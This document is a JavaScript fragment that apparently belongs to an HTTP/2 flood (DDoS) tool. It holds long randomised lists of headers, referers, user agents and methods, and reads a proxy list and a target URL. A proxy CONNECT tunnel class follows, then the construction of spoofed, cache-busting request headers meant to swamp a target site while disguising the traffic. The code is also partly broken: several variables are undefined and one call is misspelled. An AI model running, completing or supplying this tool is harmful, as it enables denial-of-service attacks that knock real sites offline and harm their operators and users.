const lang_header = ["ko-KR", 'en-US', "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU", 'en-GB,en-US;q=0.9,en;q=0.8', 'en-GB,en;q=0.5', "en-CA", "en-UK, en, de;q=0.5", "en-NZ", 'en-GB,en;q=0.6', "en-ZA", 'en-IN', "en-PH", 'en-SG', "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", "en-US,en;q=0.9", "en-GB,en;q=0.9", 'en-CA,en;q=0.9', "en-AU,en;q=0.9", 'en-NZ,en;q=0.9', 'en-ZA,en;q=0.9', "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", "da-DK,da;q=0.9", "de-DE,de;q=0.9", 'el-GR,el;q=0.9', "es-ES,es;q=0.9", "et-EE,et;q=0.9", 'eu-ES,eu;q=0.9', "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", 'fr-FR,fr;q=0.9', "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", 'it-IT,it;q=0.9', "ja-JP,ja;q=0.9", 'ka-GE,ka;q=0.9', 'kk-KZ,kk;q=0.9', 'km-KH,km;q=0.9', 'kn-IN,kn;q=0.9', "ko-KR,ko;q=0.9", "ky-KG,ky;q=0.9", "lo-LA,lo;q=0.9", "lt-LT,lt;q=0.9", "lv-LV,lv;q=0.9", 'mk-MK,mk;q=0.9', "ml-IN,ml;q=0.9", "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", 'ms-MY,ms;q=0.9', "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", 'nb-NO,nb;q=0.9', 'ne-NP,ne;q=0.9', "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", 'or-IN,or;q=0.9', "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", 'pt-BR,pt;q=0.9', 'pt-PT,pt;q=0.9', 'ro-RO,ro;q=0.9', "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9', "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "th-TH,th;q=0.9", 'tr-TR,tr;q=0.9', "uk-UA,uk;q=0.9", 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9', "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", 'as-IN,as;q=0.8', "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", 'bs-Cyrl-BA,bs;q=0.8', 'bs-Latn-BA,bs;q=0.8', "dz-BT,dz;q=0.8", 'fil-PH,fil;q=0.8', "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", 'fr-LU,fr;q=0.8', "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", 'mn-Mong-CN,mn;q=0.8', "mr-MN,mr;q=0.8", 'ms-BN,ms;q=0.8', 'mt-MT,mt;q=0.8', "mua-CM,mua;q=0.8", 'nds-DE,nds;q=0.8', 'ne-IN,ne;q=0.8', 'nso-ZA,nso;q=0.8', 'oc-FR,oc;q=0.8', "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", 'quz-EC,quz;q=0.8', "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", 'tg-Cyrl-TJ,tg;q=0.8', "ti-ER,ti;q=0.8", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"];
const encoding_header = ["gzip, deflate, br", "gzip, deflate, br, zstd", "compress, gzip", "deflate, gzip", "gzip, identity", '*', '*', "*/*", "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", 'br', "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", 'identity', "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", 'deflate', "gzip, deflate, lzma, sdch", "deflate"];
const control_header = ["max-age=604800", 'proxy-revalidate', "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", 's-maxage=604800', "max-stale", "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", 'max-age=31536000,public,immutable', "max-age=31536000,public", "min-fresh", "private", "public", 's-maxage', "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", 'no-transform', "max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0", "must-understand, no-store", "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", "max-age=120", "max-age=0,no-cache,no-store,must-revalidate", "public, max-age=604800, immutable", "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", "max-age=604800, stale-while-revalidate=86400", "max-stale=3600", "public, max-age=2678400", 'min-fresh=600', "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", "public, s-maxage=600, max-age=60", "public, max-age=31536000", "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "X-Access-Control: Allow-Origin", "Cache-Control: no-cache, no-store, must-revalidate", "Authorization: Bearer your_token", "Content-Control: no-transform", "X-RateLimit-Limit: 1000", "Proxy-Connection: keep-alive", "X-Frame-Options: SAMEORIGIN", "Strict-Transport-Security: max-age=31536000; includeSubDomains", "X-Content-Type-Options: nosniff", "Retry-After: 120", "Connection: close", "Accept-Ranges: bytes", "ETag: \"33a64df551425fcc55e4d42a148795d9f25f89d4\"", "X-DNS-Prefetch-Control: off", "Expires: Thu, 01 Jan 1970 00:00:00 GMT", "X-Download-Options: noopen", "X-Permitted-Cross-Domain-Policies: none", "X-Frame-Options: DENY", "Expect-CT: max-age=86400, enforce", "Upgrade-Insecure-Requests: 1", "X-Forwarded-Proto: https", "Access-Control-Allow-Origin: *", "X-Content-Duration: 3600", "Alt-Svc: h3=\":443\"", "X-XSS-Protection: 1; mode=block", "Referrer-Policy: no-referrer", "X-Pingback: /xmlrpc.php", "Content-Encoding: gzip", "Age: 3600", "X-Clacks-Overhead: GNU Terry Pratchett", "Server: Apache/2.4.41 (Unix)", "X-Powered-By: PHP/7.4.3", "Allow: GET, POST, HEAD", "Retry-After: 3600", "Access-Control-Allow-Methods: GET, POST, OPTIONS", "X-UA-Compatible: IE=edge", "Public-Key-Pins: max-age=5184000; pin-sha256=\"base64+primary==\"; pin-sha256=\"base64+backup==\"; includeSubDomains; report-uri=\"https://example.com/hpkp-report\"", "Content-Language: en-US", "X-Permitted-Cross-Domain-Policies: none", "Strict-Transport-Security: max-age=15768000; includeSubDomains", "Access-Control-Allow-Headers: Content-Type", "X-Frame-Options: ALLOW-FROM https://example.com/", "X-Robots-Tag: noindex, nofollow", "Access-Control-Max-Age: 3600", "X-Cache-Status: MISS", "Vary: Accept-Encoding", "X-GeoIP-Country-Code: US", "X-Do-Not-Track: 1", "X-Request-ID: 12345", "X-Correlation-ID: abcde", "DNT: 1", "X-Device-Type: mobile", "X-Device-OS: Android", "X-Device-Model: Galaxy S10", "X-App-Version: 2.1.0", "X-User-ID: 123", "X-Session-ID: xyz", "X-Feature-Flag: new_feature_enabled", "X-Experiment-ID: experiment_123", "X-Ab-Test: variant_b", "X-Tracking-Consent: accepted", "X-Customer-Segment: premium", "X-User-Role: admin", "X-Client-ID: client_567", "X-Internal-Request: true", "X-Service-Name: backend-api", "X-Backend-Server: server-1", "X-Database-Query: SELECT * FROM users", "X-Cache-Control: no-store", "X-Environment: production", "X-Debug-Mode: false", "X-Remote-IP: 203.0.113.195", "X-Proxy: true", "X-Origin: https://www.example.com", "X-FastCGI-Cache: HIT", "X-Pagination-Total: 1000", "X-Pagination-Page: 5", "X-Pagination-Limit: 20", "X-Notification-Count: 3", "X-Message-ID: msg_123", "X-Notification-Type: alert", "X-Notification-Priority: high", "X-Queue-Depth: 50", "X-Queue-Position: 10", "X-Queue-Status: active", "X-Content-Hash: sha256=abcdef123456", "X-Resource-ID: resource_789", "X-Resource-Type: article", "X-Transaction-ID: tx_456", "X-Transaction-Status: success", "X-Transaction-Amount: $100.00", "X-Transaction-Currency: USD", "X-Transaction-Date: 2024-01-24T12:00:00Z", "X-Payment-Method: credit_card", "X-Payment-Status: authorized", "X-Shipping-Method: express", "X-Shipping-Cost: $10.00", "X-Subscription-Status: active", "X-Subscription-Type: premium", 'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64'];
const refers = ["https://captcha.request123.xyz/?__cf_chl_tk=FfHpmlpM4i4EZ4rflLFtMgD2WqkoR5pCXfcXro4KcdI-1713811530-0.0.1.1-1322", 'http://anonymouse.org/cgi-bin/anon-www.cgi/', "https://cfcybernews.eu/?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514", 'http://coccoc.com/search#query=', "http://ddosvn.somee.com/f5.php?v=", "http://engadget.search.aol.com/search?q=", "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", "http://funnymama.com/search?q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", 'http://help.baidu.com/searchResult?keywords=', "http://host-tracker.com/check_page/?furl=", "http://itch.io/search?q=", "http://jigsaw.w3.org/css-validator/validator?uri=", 'http://jobs.bloomberg.com/search?q=', 'http://jobs.leidos.com/search?q=', "http://jobs.rbs.com/jobs/search?q=", "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://louis-ddosvn.rhcloud.com/f5.html?v=", 'http://millercenter.org/search?q=', "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=", "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=", "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=", 'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=', "http://search.aol.com/aol/search?q=", "http://taginfo.openstreetmap.org/search?q=", 'http://techtv.mit.edu/search?q=', 'http://validator.w3.org/feed/check.cgi?url=', "http://vk.com/profile.php?redirect=", "http://www.ask.com/web?q=", "http://www.baoxaydung.com.vn/news/vn/search&q=", "http://www.bestbuytheater.com/events/search?q=", "http://www.bing.com/search?q=", 'http://www.evidence.nhs.uk/search?q=', 'http://www.google.com/?q=', 'http://www.google.com/translate?u=', 'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=', 'http://www.pagescoring.com/website-speed-test/?url=', "http://www.reddit.com/search?q=", 'http://www.search.com/search?q=', 'http://www.shodanhq.com/search?q=', "http://www.ted.com/search?q=", "http://www.topsiteminecraft.com/site/pinterest.com/search?q=", "http://www.usatoday.com/search/results?q=", "http://www.ustream.tv/search?q=", 'http://yandex.ru/yandsearch?text=', "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", "https://add.my.yahoo.com/rss?url=", "https://careers.carolinashealthcare.org/search?q=", "https://check-host.net/", 'https://developers.google.com/speed/pagespeed/insights/?url=', 'https://drive.google.com/viewerng/viewer?url=', "https://duckduckgo.com/?q=", "https://google.com/", 'https://play.google.com/store/search?q=', "https://pornhub.com/", "https://r.search.yahoo.com/", "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", "https://steamcommunity.com/market/search?q=", "https://vk.com/profile.php?redirect=", 'https://www.bing.com/search?q=', "https://www.cia.gov/index.html", 'https://www.facebook.com/', "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 'https://www.fbi.com/', "https://www.google.ad/search?q=", "https://www.google.ae/search?q=", "https://www.google.al/search?q=", "https://www.google.co.ao/search?q=", "https://www.google.com.af/search?q=", "https://www.google.com.ag/search?q=", 'https://www.google.com.ai/search?q=', "https://www.google.com/search?q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=", "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=", "https://www.npmjs.com/search?q=", "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=", "https://www.pinterest.com/search/?q=", "https://www.qwant.com/search?q=", 'https://www.ted.com/search?q=', "https://www.usatoday.com/search/results?q=", "https://www.yandex.com/yandsearch?text=", 'https://www.youtube.com/'];
const userAgents = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:54.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/54.0", "Mozilla/5.0 (Linux; Android 4.3; Galaxy Nexus Build/JWR66Y; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:53.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/53.0", "Mozilla/5.0 (X11; Linux x86_64; rv:49.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Linux; Android 4.3; Galaxy Nexus Build/JWR66Y; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.68 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:47.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/47.0", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36", "Mozilla/5.0 (Linux; Android 4.1.2; Galaxy Nexus Build/JZO54K; GTmetrix https://gtmetrix.com/) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile Safari/537.22", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:39.0; GTmetrix http://gtmetrix.com/) Gecko/20100101 Firefox/39.0", "Mozilla/5.0 (Linux; Android 4.1.2; Galaxy Nexus Build/JZO54K; GTmetrix http://gtmetrix.com/) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile Safari/537.22", "Mozilla/5.0 (X11; Linux x86_64; rv:43.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/43.0", "Mozilla/5.0 (X11; Linux x86_64; rv:41.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/41.0"];
const Methods = ["GET", "HEAD", "POST", "PUT", 'DELETE', 'CONNECT', "OPTIONS", "TRACE", 'PATCH', "PURGE", 'LINK', "UNLINK"];
const queryString = ['', '&', '?', '&&', "and", '=', '+', '?', '=', '&', '=', '&', '=', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&', '=', '&'];
const useragentl = ["(CheckSecurity 2_0)", "(BraveBrowser 5_0)", "(ChromeBrowser 3_0)", "(ChromiumBrowser 4_0)", "(AtakeBrowser 2_0)", "(NasaChecker)", "(CloudFlareIUAM)", '(NginxChecker)', '(AAPanel)', "(AntiLua)", "(FushLua)", "(FBIScan)", "(FirefoxTop)", "(ChinaNet Bot)", "(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36)", "(Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0)", "(Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36)", "(Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1)", "(Googlebot/2.1; +http://www.google.com/bot.html)", "(Bingbot/2.0; +http://www.bing.com/bingbot.htm)", "(YandexBot/3.0; +http://yandex.com/bots)", "(DuckDuckBot/1.0; +https://duckduckgo.com/duckduckbot)", "(Scrapy/2.4.0; +https://scrapy.org)", "(Wget/1.21.1)", "(curl/7.68.0)", "(Python-requests/2.25.1)", "(Apache-HttpClient/4.5.13)", "(PostmanRuntime/7.28.0)", "(Insomnia/2021.5.2)", "(Java/11.0.10)", "(Go-http-client/1.1)", "(HttpClient/4.5)", "(HTTrack 3.49; Windows)", "(WebScraperBot/1.0; +https://webscraper.io/bot)"];
const mozilla = ["Mozilla/5.0 ", "Mozilla/6.0 ", "Mozilla/7.0 ", "Mozilla/8.0 ", "Mozilla/9.0 "];
const platform = ["Windows", "Macintosh", 'Linux', "Android", "PlayStation 4", "iPhone", "iPad", "Windows Phone",, 'iOS', "Android", "PlayStation 5", "Xbox One", "Nintendo Switch", "Apple TV", "Amazon Fire TV", "Roku", "Chromecast", "Smart TV", "Other"];
const version = ["\"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"Chromium\";v=\"109\", \"Google Chrome\";v=\"109\"", "\"Chromium\";v=\"121\", \"Google Chrome\";v=\"121\", \"Opera GX\";v=\"106\"", "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"", "\"Firefox\";v=\"11\", \"Chromium\";v=\"98\", \"(Not A:Brand\";v=\"8\"", "\"Firefox\";v=\"24\", \"Presto\";v=\"2.7.62\", \"Firefox\";v=\"17\"", "\"Firefox\";v=\"29\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"", "\"Firefox\";v=\"31\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"", "\"Firefox\";v=\"40\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\"Google Chrome\";v=\"42\", \"Google Chrome\";v=\"51\", \"Google Chrome\";v=\"58\"", "\"Google Chrome\";v=\"58\", \"Google Chrome\";v=\"42\", \"Google Chrome\";v=\"51\"", "\"Google Chrome\";v=\"72\", \"Google Chrome\";v=\"104\", \"Google Chrome\";v=\"109\"", "\"Google Chrome\";v=\"86\", \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"86\"", "\"Google Chrome\";v=\"96\", \"Not_A Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"", "\"Google Chrome\";v=\"96\", \"Firefox\";v=\"29\", \"Chromium\";v=\"96\"", "\"Google Chrome\";v=\"100\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"107\"", "\"Google Chrome\";v=\"101\", \"Microsoft Edge\";v=\"100\", \"Google Chrome\";v=\"101\"", "\"Google Chrome\";v=\"104\", \"Google Chrome\";v=\"109\", \"Google Chrome\";v=\"72\"", "\"Google Chrome\";v=\"107\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"", "\"Google Chrome\";v=\"109\", \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"109\"", "\"Google Chrome\";v=\"112\", \"Google Chrome\";v=\"113\", \"Not A Brand\";v=\"99\"", "\"Google Chrome\";v=\"113\", \"Google Chrome\";v=\"112\", \"Not A Brand\";v=\"99\"", "\"Microsoft Edge\";v=\"96\", \"Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"", "\"Microsoft Edge\";v=\"100\", \"Google Chrome\";v=\"101\", \"Google Chrome\";v=\"101\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Opera\";v=\"86\"", "\"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\"", "\"Not_A Brand\";v=\"24\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\", \"Opera GX\";v=\"106\""];
const browsers = ["Microsoft Edge", "Google Chrome", 'Firefox', "Safari", "Opera", "Chrome Android", "Samsung Internet", "WebView Android"];
const sechuas = ["Android", "Chrome OS", "Chromium OS", "iOS", 'Linux', "macOS", "Unknown", "Windows"];
var RipperSec = Methods[Math.floor(Math.random() * Methods.length)];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var platform1 = platform[Math.floor(Math.random() * platform.length)];
var versi = version[Math.floor(Math.random() * version.length)];
var uap1 = userAgents[Math.floor(Math.floor(Math.random() * userAgents.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
class NetSocket {
  constructor() {}
  async ['HTTP'](_0x5b2a5b, _0x37b110) {
    if (typeof _0x5b2a5b !== "object" || _0x5b2a5b === null || typeof _0x37b110 !== "function") {
      return _0x37b110(undefined, "error: invalid arguments");
    }
    const {
      address: _0x579c68,
      host: _0x5cb750,
      port: _0x26ed0b,
      timeout: _0x153ae9
    } = _0x5b2a5b;
    if (!_0x579c68 || !_0x5cb750 || !_0x26ed0b || _0x153ae9 <= 0x0) {
      return _0x37b110(undefined, "error: missing or invalid options");
    }
    const _0x5a37fc = _0x579c68.split(':');
    if (_0x5a37fc.length !== 0x2) {
      return _0x37b110(undefined, "error: invalid address format");
    }
    const _0x4120e7 = parseInt(_0x5a37fc[0x1], 0xa);
    const _0x12616a = "CONNECT " + _0x579c68 + ':' + _0x4120e7 + " HTTP/1.1\r\nHost: " + _0x579c68 + ':' + _0x4120e7 + "\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x535003 = Buffer.from(_0x12616a);
    return new Promise((_0x1e0848, _0x3692c1) => {
      const _0x3a51f9 = net.connect({
        'host': _0x5cb750,
        'port': _0x26ed0b
      });
      _0x3a51f9.setTimeout(_0x153ae9 * 0x3e8);
      _0x3a51f9.setKeepAlive(true, 0x186a0);
      _0x3a51f9.on("connect", () => {
        _0x3a51f9.write(_0x535003);
      });
      _0x3a51f9.on("data", _0x4d167c => {
        const _0x196180 = _0x4d167c.toString("utf-8");
        if (!_0x196180.includes("HTTP/1.1 200")) {
          _0x3a51f9.destroy();
          _0x3692c1(new Error("error: invalid response from proxy server"));
        } else {
          _0x1e0848(_0x3a51f9);
        }
      });
      _0x3a51f9.on("timeout", () => {
        _0x3a51f9.destroy();
        _0x3692c1(new Error("error: timeout exceeded"));
      });
      _0x3a51f9.on("error", _0xc47ab0 => {
        _0x3a51f9.destroy();
        _0x3692c1(_0xc47ab0);
      });
    }).then(_0x35a448 => _0x37b110(_0x35a448, undefined))['catch'](_0xf0efb9 => _0x37b110(undefined, _0xf0efb9.message));
  }
}
const Socker = new NetSocket();
headers[':method'] = "GET";
RipperSec;
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.randdom() * pathts.length)] + '&' + randstr(0xa) + queryString + randstr(0xa);
headers[':scheme'] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = control;
headers['X-Forwarded-For'] = spoofed;
headers["sec-ch-ua"] = "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"";
versi;
headers["sec-ch-ua-mobile"] = sechuas[Math.floor(Math.random() * sechuas.length)];
headers['sec-ch-ua-platform'] = browsers[Math.floor(Math.random() * browsers.length)] + platform1;
headers["accept-language"] = lang;
headers['accept-encoding'] = encoding;
headers['upgrade-insecure-requests'] = Math.random() > 0.5;
headers.Connection = "keep-alive";
headers.accept = accept;
